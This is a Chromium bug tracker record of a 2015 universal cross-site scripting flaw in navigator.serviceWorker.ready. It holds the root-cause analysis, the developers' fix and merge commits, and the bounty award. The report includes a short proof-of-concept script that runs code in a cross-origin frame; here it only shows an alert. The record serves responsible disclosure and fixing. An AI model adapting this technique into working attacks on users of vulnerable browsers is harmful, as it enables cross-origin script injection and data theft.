# Security: Universal XSS using navigator.serviceWorker.ready

| Field | Value |
|-------|-------|
| **Issue ID** | [40082701](https://issues.chromium.org/issues/40082701) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>ServiceWorker |
| **Reporter** | ma...@gmail.com |
| **Assignee** | yh...@chromium.org |
| **Created** | 2015-08-20 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

From /WebKit/Source/modules/serviceworkers/ServiceWorkerContainer.cpp:

---

ScriptPromise ServiceWorkerContainer::ready(ScriptState\* callerState)  

{  

if (!executionContext())  

return ScriptPromise();  

(...)  

if (!m\_ready) {  

m\_ready = createReadyProperty();  

if (m\_provider)  

m\_provider->getRegistrationForReady(new GetRegistrationForReadyCallback(m\_ready.get()));  

}

```
return m_ready->promise(callerState->world());  

```
## }

|m\_ready| inherits the execution context of the serviceWorkerContainer, and that's the context associated with the navigator's frame when the container is created in NavigatorServiceWorker::serviceWorker. The navigator object can be recreated with the frame holding a cross-origin window, so the promise object created in the |m\_ready->promise(callerState->world())| call may end up using a wrong creation context.

**VERSION**  

Chrome 44.0.2403.155 (Stable)  

Chrome 45.0.2454.46 (Beta)  

Chrome 46.0.2486.0 (Dev)  

Chromium 46.0.2488.0 (Release build compiled today)

**REPRODUCTION CASE**

<script>
var i = document.documentElement.appendChild(document.createElement('iframe'));
var f = frames[0].Function;
i.onload = function() {
f('return navigator')().serviceWorker.ready.constructor.constructor('alert(location)')();
}
i.src = 'https://abc.xyz';
</script>

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 278 B)

## Timeline

### ma...@gmail.com (2015-08-20)

I was thinking about a potential fix to this issue, and wondered if it'd be an acceptable solution to disallow the creation of navigator objects from inactive DOMWindows. In debug builds, as soon as unloadedWindow.navigator.serviceWorker is accessed, content::ServiceWorkerDispatcher::AddProviderClient fails to assert for |!ContainsKey(provider_clients_, provider_id)|, so apparently having a navigator with |m_frame| holding a different window breaks more invariants. If you're okay with the idea, I've got a patch + test for it.

### th...@chromium.org (2015-08-20)

[Empty comment from Monorail migration]

### jw...@chromium.org (2015-08-20)

kinuko@, can you take a look and assign to someone appropriate? Thanks!

### cl...@chromium.org (2015-08-20)

[Empty comment from Monorail migration]

### ki...@chromium.org (2015-08-21)

Um, looks serious. Let us take a deeper look.

### ho...@chromium.org (2015-08-21)

I think we have to check the security origin in NavigatorServiceWorker::serviceWorker().

Created a CL: https://codereview.chromium.org/1307883002

### yh...@chromium.org (2015-08-21)

When navigating, the frame's window is reset[1] and navigator is detached. If navigator is requested to Window[2] after that, the window creates a new navigator and the navigator thinks it is registered to the frame, but it is not true. A new window is registered to the frame and hence There is a link from window -> navigator -> frame -> another window. I think that should be fixed.

1: https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp&q=DOMWindow::reset&sq=package:chromium&type=cs&l=523
2: https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp&q=DOMWindow::navigator&sq=package:chromium&type=cs&l=662


### ho...@chromium.org (2015-08-21)

Ah yes. The root cause of this issue is that LocalDOMWindow::navigator() can creates a new Navigator even if LocalDOMWindow::reset() has been called.
I think we should check |m_hasBeenReset| in LocalDOMWindow::navigator().

### yh...@chromium.org (2015-08-21)

I wrote https://codereview.chromium.org/1308723003/. I would love to be reviewed by experts because I don't fully understand navigator requirements.


### np...@chromium.org (2015-08-21)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-08-21)

[Empty comment from Monorail migration]

### yh...@chromium.org (2015-08-24)

[Empty comment from Monorail migration]

### ki...@chromium.org (2015-08-24)

(Thanks yhirano@!)

### bu...@chromium.org (2015-08-24)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201055

------------------------------------------------------------------
r201055 | yhirano@chromium.org | 2015-08-24T10:02:32.982204Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/serviceworker/chromium/frame-removed.html?r1=201055&r2=201054&pathrev=201055
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/serviceworker/chromium/frame-detached-by-navigation.html?r1=201055&r2=201054&pathrev=201055
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/frame/LocalDOMWindow.cpp?r1=201055&r2=201054&pathrev=201055

DOMWindow::navigator should return a navigator w/o frame when detached.

Currently DOMWindow::navigator returns a navigator associated with a frame
even when the window is detached from the frame and another window
is attached to it. That means calling frame()->document() may return
an incorrect document, for example.

This CL makes LocalDOMWindow::navigator return a navigator with
a null frame when the window is not associated to the frame.

BUG=522791

Review URL: https://codereview.chromium.org/1308723003
-----------------------------------------------------------------

### yh...@chromium.org (2015-08-24)

[Empty comment from Monorail migration]

### pe...@google.com (2015-08-25)

Approved for M46 (branch: 2490)

### cl...@chromium.org (2015-08-25)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-08-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-08-26)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201182

------------------------------------------------------------------
r201182 | yhirano@chromium.org | 2015-08-26T01:48:10.805054Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/2490/Source/core/frame/LocalDOMWindow.cpp?r1=201182&r2=201181&pathrev=201182
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/serviceworker/chromium/frame-removed.html?r1=201182&r2=201181&pathrev=201182
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/serviceworker/chromium/frame-detached-by-navigation.html?r1=201182&r2=201181&pathrev=201182

Merge 201055 "DOMWindow::navigator should return a navigator w/o..."

> DOMWindow::navigator should return a navigator w/o frame when detached.
> 
> Currently DOMWindow::navigator returns a navigator associated with a frame
> even when the window is detached from the frame and another window
> is attached to it. That means calling frame()->document() may return
> an incorrect document, for example.
> 
> This CL makes LocalDOMWindow::navigator return a navigator with
> a null frame when the window is not associated to the frame.
> 
> BUG=522791
> 
> Review URL: https://codereview.chromium.org/1308723003

TBR=yhirano@chromium.org

Review URL: https://codereview.chromium.org/1320533003
-----------------------------------------------------------------

### yh...@chromium.org (2015-08-26)

[Empty comment from Monorail migration]

### am...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### am...@google.com (2015-08-26)

Merge approved for M45 branch 2454.

### bu...@chromium.org (2015-08-27)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201276

------------------------------------------------------------------
r201276 | yhirano@chromium.org | 2015-08-27T01:59:24.561564Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/serviceworker/chromium/frame-detached-by-navigation.html?r1=201276&r2=201275&pathrev=201276
   M http://src.chromium.org/viewvc/blink/branches/chromium/2454/Source/core/frame/LocalDOMWindow.cpp?r1=201276&r2=201275&pathrev=201276
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/serviceworker/chromium/frame-removed.html?r1=201276&r2=201275&pathrev=201276

Merge 201055 "DOMWindow::navigator should return a navigator w/o..."

> DOMWindow::navigator should return a navigator w/o frame when detached.
> 
> Currently DOMWindow::navigator returns a navigator associated with a frame
> even when the window is detached from the frame and another window
> is attached to it. That means calling frame()->document() may return
> an incorrect document, for example.
> 
> This CL makes LocalDOMWindow::navigator return a navigator with
> a null frame when the window is not associated to the frame.
> 
> BUG=522791
> 
> Review URL: https://codereview.chromium.org/1308723003

TBR=yhirano@chromium.org

Review URL: https://codereview.chromium.org/1314293002
-----------------------------------------------------------------

### ti...@google.com (2015-08-31)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-31)

Congratulations - $7,500 for this report! 2 rewards in 2 minutes - a good day for you today :)

We'll credit you in our Chrome release notes tomorrow as "Marius Mlynski". Please let me know if you want to use a different name.

Any questions, either update the bug or reach out to me at timwillis@

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### ti...@google.com (2015-09-04)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-09-08)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201889

------------------------------------------------------------------
r201889 | horo@chromium.org | 2015-09-08T03:28:04.054640Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/serviceworkers/NavigatorServiceWorker.cpp?r1=201889&r2=201888&pathrev=201889
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/serviceworkers/NavigatorServiceWorker.h?r1=201889&r2=201888&pathrev=201889
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/serviceworkers/NavigatorServiceWorker.idl?r1=201889&r2=201888&pathrev=201889

Add ASSERT() to avoid accidental leaking ServiceWorkerContainer to cross origin context.

BUG=522791

Review URL: https://codereview.chromium.org/1305903007
-----------------------------------------------------------------

### bu...@chromium.org (2015-09-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/7ee897723127d0b8fecc5e67d45e20179c760e6e

commit 7ee897723127d0b8fecc5e67d45e20179c760e6e
Author: horo@chromium.org <horo@chromium.org>
Date: Tue Sep 08 03:28:04 2015

Add ASSERT() to avoid accidental leaking ServiceWorkerContainer to cross origin context.

BUG=522791

Review URL: https://codereview.chromium.org/1305903007

git-svn-id: svn://svn.chromium.org/blink/trunk@201889 bbb929c8-8fbe-4397-9dbb-9b2b20218538

[modify] http://crrev.com/7ee897723127d0b8fecc5e67d45e20179c760e6e/third_party/WebKit/Source/modules/serviceworkers/NavigatorServiceWorker.cpp
[modify] http://crrev.com/7ee897723127d0b8fecc5e67d45e20179c760e6e/third_party/WebKit/Source/modules/serviceworkers/NavigatorServiceWorker.h
[modify] http://crrev.com/7ee897723127d0b8fecc5e67d45e20179c760e6e/third_party/WebKit/Source/modules/serviceworkers/NavigatorServiceWorker.idl


### bu...@chromium.org (2015-09-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b6509b20619dcab4e19b1cb74c9dfe16a935c08e

commit b6509b20619dcab4e19b1cb74c9dfe16a935c08e
Author: yhirano@chromium.org <yhirano@chromium.org>
Date: Wed Aug 26 01:48:10 2015

Merge 201055 "DOMWindow::navigator should return a navigator w/o..."

> DOMWindow::navigator should return a navigator w/o frame when detached.
> 
> Currently DOMWindow::navigator returns a navigator associated with a frame
> even when the window is detached from the frame and another window
> is attached to it. That means calling frame()->document() may return
> an incorrect document, for example.
> 
> This CL makes LocalDOMWindow::navigator return a navigator with
> a null frame when the window is not associated to the frame.
> 
> BUG=522791
> 
> Review URL: https://codereview.chromium.org/1308723003

TBR=yhirano@chromium.org

Review URL: https://codereview.chromium.org/1320533003

git-svn-id: svn://svn.chromium.org/blink/branches/chromium/2490@201182 bbb929c8-8fbe-4397-9dbb-9b2b20218538

[add] http://crrev.com/b6509b20619dcab4e19b1cb74c9dfe16a935c08e/third_party/WebKit/LayoutTests/http/tests/serviceworker/chromium/frame-detached-by-navigation.html
[add] http://crrev.com/b6509b20619dcab4e19b1cb74c9dfe16a935c08e/third_party/WebKit/LayoutTests/http/tests/serviceworker/chromium/frame-removed.html
[modify] http://crrev.com/b6509b20619dcab4e19b1cb74c9dfe16a935c08e/third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp


### bu...@chromium.org (2015-09-24)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/b6509b20619dcab4e19b1cb74c9dfe16a935c08e

commit b6509b20619dcab4e19b1cb74c9dfe16a935c08e
Author: yhirano@chromium.org <yhirano@chromium.org>
Date: Wed Aug 26 01:48:10 2015


### yh...@chromium.org (2015-11-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-01)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-11-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/8af846a42f5d526148e97385ecdcc35184e08b45

commit 8af846a42f5d526148e97385ecdcc35184e08b45
Author: Matt Falkenhagen <falken@chromium.org>
Date: Thu Nov 09 11:00:38 2017

service worker: Upstream frame removal/detached tests.

This expands and upstreams:
* chromium/frame-detached-by-navigation.html
* chromium/frame-removed.html

Chromium behavior seems a bit weird but for now upload the WPT
to get the test visible, and we can refine the expectations later.

Bug: 713732, 522791, 688116
Change-Id: I4af7fb668f9ef2e4aaff580ba129e6ae353f0e18
Reviewed-on: https://chromium-review.googlesource.com/760061
Commit-Queue: Matt Falkenhagen <falken@chromium.org>
Reviewed-by: Kinuko Yasuda <kinuko@chromium.org>
Cr-Commit-Position: refs/heads/master@{#515134}
[modify] https://crrev.com/8af846a42f5d526148e97385ecdcc35184e08b45/third_party/WebKit/LayoutTests/FlagExpectations/enable-blink-features=LayoutNG
[modify] https://crrev.com/8af846a42f5d526148e97385ecdcc35184e08b45/third_party/WebKit/LayoutTests/TestExpectations
[modify] https://crrev.com/8af846a42f5d526148e97385ecdcc35184e08b45/third_party/WebKit/LayoutTests/external/wpt/service-workers/service-worker/detached-context.https.html
[delete] https://crrev.com/bd4e3a9b4d6469e2e191747bb00c3779d9d46e10/third_party/WebKit/LayoutTests/http/tests/serviceworker/chromium/frame-detached-by-navigation.html
[delete] https://crrev.com/bd4e3a9b4d6469e2e191747bb00c3779d9d46e10/third_party/WebKit/LayoutTests/http/tests/serviceworker/chromium/frame-removed.html


### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/522791?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082701)*
